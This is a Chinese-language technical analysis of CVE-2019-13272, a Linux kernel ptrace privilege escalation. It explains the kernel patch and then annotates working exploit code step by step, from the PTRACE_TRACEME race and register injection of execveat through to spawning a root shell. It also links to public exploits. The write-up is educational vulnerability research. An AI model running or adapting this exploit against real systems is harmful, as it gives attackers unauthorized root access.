    --- a/kernel/ptrace.c
    +++ b/kernel/ptrace.c
    @@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,
      */
     static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
     {
    -   rcu_read_lock();
    -   __ptrace_link(child, new_parent, __task_cred(new_parent));
    -   rcu_read_unlock();
    +   __ptrace_link(child, new_parent, current_cred());
     }
我们再次看看 jann horn 的补丁: ‘__task_cred(new_parent)’ -> ‘current_cred()’
补丁的意思是说在 PTRACE_TRACEME 这种场景下， ptracer_cred 记录的不应该是父进程的 cred， 而应该是自己的 cred
所以我觉得从这个变量的用途来说，它其实记录的不是 tracer 的 cred, 而是 ‘trace link creater’ 的 cred
我建议 jann horn 将这个变量名改成 ptracelinkcreater_cred, 当 trace link 由 PTRACE_ATTACH
建立时， 它等于 tracer 的 cred, 当 trace link 由 PTRACE_TRACEME 建立时， 它等于 tracee 的 cred,
它实际上记录的是 trace 关系建立者的权限 !
## exploit
本漏洞利用的关键是找到合适的可执行程序启动 task B, 这个可执行程序要满足如下条件:
  * 1, 必须是能被普通权限用户调用
  * 2, 执行时必须有提权到root的阶段
  * 3, 执行提权后必须执行降权
(短暂提权到 root 的目的是让 task C 可以获取 root 的 ptracer_cred, 再降权的目的是让 B 能被普通权限的进程 ptrace
attach)
这里我列出 3 份 exploit 代码:
  * 1 [jann horn 的 exploit](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217)
  * 2 [bcoles 的 exploit](https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c)
  * 3 [jiayy 的 exploit](https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272)
[jann horn 的 exploit](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217) 里使用桌面发行版自带的
[pkexec](http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html) 程序用于启动
task B
[pkexec](http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html)
允许特权用户以其他用户权限执行另外一个可执行程序， 用于
[polkit](https://wiki.archlinux.org/index.php/Polkit) 认证框架, 当使用 –user 参数时，
刚好可以让进程先提权到 root 然后再降权到指定用户，因此可以用于构建进程 B, 此外需要找到通过 polkit 框架执行的可执行程序(jann horn
把他们成为 helper)， 这些 helper 程序需要满足普通用户用 pkexec 执行它们时不需要认证（很多通过 polkit
执行的程序都需要弹窗认证）, 执行的模式如下:
  * /usr/bin/pkexec –user nonrootuser /user/sbin/some-helper-binary
[bcoles 的 exploit](https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c) 在 jann horn 的基础上增加了寻找更多 helper
binary 的代码， 因为 jann horn 的 helper 是一个写死的程序， 在很多发行版并不存在，所以他的 exploit
在很多发行版系统上无法运行， bcoles 的 exploit 可以在更多的发行版上运行成功
本人出于学习的目的，也写了一份 [jiayy 的 exploit](https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272), 因为 helper binary 因不同发行版而异， pkexec
也是桌面发行版才有， 而事实上这个提权漏洞是 linux kernel 的漏洞， 所以我把 jann horn 的 exploit 改成了使用一个
fakepkexec 程序来提权， 而这个 fakepkexec 和 fakehelper
程序手动生成（而不是从目标系统搜索），这样一来学习者可以在任何存在本漏洞的 linux 系统（不需要桌面）运行我的 exploit 进行研究
## exploit 分析
下面简单过一下 exploit 的代码
    167 int main(int argc, char **argv) {
    168   if (strcmp(argv[0], "stage2") == 0)
    169     return middle_stage2();
    170   if (strcmp(argv[0], "stage3") == 0)
    171     return spawn_shell();
    172 
    173   helper_path = "/tmp/fakehelper";
    174 
    175   /*
    176    * set up a pipe such that the next write to it will block: packet mode,
    177    * limited to one packet
    178    */
    179   SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
    180   SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
    181   char dummy = 0;
    182   SAFE(write(block_pipe[1], &dummy, 1));
    183 
    184   /* spawn pkexec in a child, and continue here once our child is in execve() */
    185   static char middle_stack[1024*1024];
    186   pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
    187                             CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));
    188   if (!middle_success) return 1;
    189 
    ======================= skip =======================
    215 }
先看行 186, 调用 clone 生成子进程（也就是 task B）, task B 运行 middle_main
     64 static int middle_main(void *dummy) {
     65   prctl(PR_SET_PDEATHSIG, SIGKILL);
     66   pid_t middle = getpid();
     67 
     68   self_fd = SAFE(open("/proc/self/exe", O_RDONLY));
     69 
     70   pid_t child = SAFE(fork());
     71   if (child == 0) {
     72     prctl(PR_SET_PDEATHSIG, SIGKILL);
     73 
     74     SAFE(dup2(self_fd, 42));
     75 
     76     /* spin until our parent becomes privileged (have to be fast here) */
     77     int proc_fd = SAFE(open(tprintf("/proc/%d/status", middle), O_RDONLY));
     78     char *needle = tprintf("\nUid:\t%d\t0\t", getuid());
     79     while (1) {
     80       char buf[1000];
     81       ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
     82       buf[buflen] = '\0';
     83       if (strstr(buf, needle)) break;
     84     }
     85 
     86     /*
     87      * this is where the bug is triggered.
     88      * while our parent is in the middle of pkexec, we force it to become our
     89      * tracer, with pkexec's creds as ptracer_cred.
     90      */
     91     SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));
     92 
     93     /*
     94      * now we execute passwd. because the ptrace relationship is considered to
     95      * be privileged, this is a proper suid execution despite the attached
     96      * tracer, not a degraded one.
     97      * at the end of execve(), this process receives a SIGTRAP from ptrace.
     98      */
     99     puts("executing passwd");
    100     execl("/usr/bin/passwd", "passwd", NULL);
    101     err(1, "execl passwd");
    102   }
    103 
    104   SAFE(dup2(self_fd, 0));
    105   SAFE(dup2(block_pipe[1], 1));
    106 
    107   struct passwd *pw = getpwuid(getuid());
    108   if (pw == NULL) err(1, "getpwuid");
    109 
    110   middle_success = 1;
    111   execl("/tmp/fakepkexec", "fakepkexec", "--user", pw->pw_name, NULL);
    112   middle_success = 0;
    113   err(1, "execl pkexec");
    114 }
行 70, 调用 fork 生成孙进程（也就是 task C）
然后行 111, task B 运行 fakepkexec 让自己提权再降权
然后看行 76 ~ 84, task C 检测到 task B 的 euid 变成 0 之后， 会执行行 91 进行 PTRACE_TRACEME 操作获取
root 的 ptracer_cred, 然后紧接着 task C 马上运行 execl 执行一个 suid binary 让自己的 euid 变成 0
    190   /*
    191    * wait for our child to go through both execve() calls (first pkexec, then
    192    * the executable permitted by polkit policy).
    193    */
    194   while (1) {
    195     int fd = open(tprintf("/proc/%d/comm", midpid), O_RDONLY);
    196     char buf[16];
    197     int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
    198     buf[buflen] = '\0';
    199     *strchrnul(buf, '\n') = '\0';
    200     if (strncmp(buf, basename(helper_path), 15) == 0)
    201       break;
    202     usleep(100000);
    203   }
    204 
    205   /*
    206    * our child should have gone through both the privileged execve() and the
    207    * following execve() here
    208    */
    209   SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));
    210   SAFE(waitpid(midpid, &dummy_status, 0));
    211   fputs("attached to midpid\n", stderr);
    212 
    213   force_exec_and_wait(midpid, 0, "stage2");
    214   return 0;
接下去回到 task A 的 main 函数， 行 194 ~ 202, task A 检测到 task B 的 binary comm 变成 helper
之后， 运行行 213 执行 force_exec_and_wait
    116 static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
    117   struct user_regs_struct regs;
    118   struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };
    119   SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
    120   SAFE(waitpid(pid, &dummy_status, 0));
    121   SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));
    122 
    123   /* set up indirect arguments */
    124   unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;
    125   struct injected_page {
    126     unsigned long argv[2];
    127     unsigned long envv[1];
    128     char arg0[8];
    129     char path[1];
    130   } ipage = {
    131     .argv = { scratch_area + offsetof(struct injected_page, arg0) }
    132   };
    133   strcpy(ipage.arg0, arg0);
    134   for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {
    135     unsigned long pdata = ((unsigned long *)&ipage)[i];
    136     SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
    137                 (void*)pdata));
    138   }
    139 
    140   /* execveat(exec_fd, path, argv, envv, flags) */
    141   regs.orig_rax = __NR_execveat;
    142   regs.rdi = exec_fd;
    143   regs.rsi = scratch_area + offsetof(struct injected_page, path);
    144   regs.rdx = scratch_area + offsetof(struct injected_page, argv);
    145   regs.r10 = scratch_area + offsetof(struct injected_page, envv);
    146   regs.r8 = AT_EMPTY_PATH;
    147 
    148   SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
    149   SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));
    150   SAFE(waitpid(pid, &dummy_status, 0));
    151 }
函数 force_exec_and_wait 的作用是使用 ptrace 控制 tracee 执行 execveat 函数替换进程的镜像, 这里它控制
task B 执行了 task A 的进程（即 exploit 的可执行程序）然后参数为 stage2, 这实际上就是让 task B 执行了
middle_stage2 函数
    167 int main(int argc, char **argv) {
    168   if (strcmp(argv[0], "stage2") == 0)
    169     return middle_stage2();
    170   if (strcmp(argv[0], "stage3") == 0)
    171     return spawn_shell();
而 middle_stage2 函数同样调用了 force_exec_and_wait , 这将使 task B 利用 ptrace 控制 task C
执行 execveat 函数，将 task C 的镜像也替换为 exploit 的 binary, 且参数是 stage3
    153 static int middle_stage2(void) {
    154   /* our child is hanging in signal delivery from execve()'s SIGTRAP */
    155   pid_t child = SAFE(waitpid(-1, &dummy_status, 0));
    156   force_exec_and_wait(child, 42, "stage3");
    157   return 0;
    158 }
当 exploit binary 以参数 stage3 运行时，实际运行的是 spawn_shell 函数, 所以 task C 最后阶段运行的是
spawn_shell
    160 static int spawn_shell(void) {
    161   SAFE(setresgid(0, 0, 0));
    162   SAFE(setresuid(0, 0, 0));
    163   execlp("bash", "bash", NULL);
    164   err(1, "execlp");
    165 }
在 spawn_shell 函数里， 它首先使用 setresgid/setresuid 将本进程的 real uid/effective uid/save
uid 都变成 root, 由于 task C 刚刚已经执行了 suid binary 将自身的 euid 变成了 root, 所以这里的
setresuid/setresgid 可以成功执行，到此为止， task C 就变成了一个完全的 root 进程， 最后再执行 execlp 启动一个
shell, 即得到了一个完整 root 权限的 shell
## 引用
  * [broken permission and object lifetime handling for PTRACE_TRACEME](https://bugs.chromium.org/p/project-zero/issues/detail?id=1903)
* * *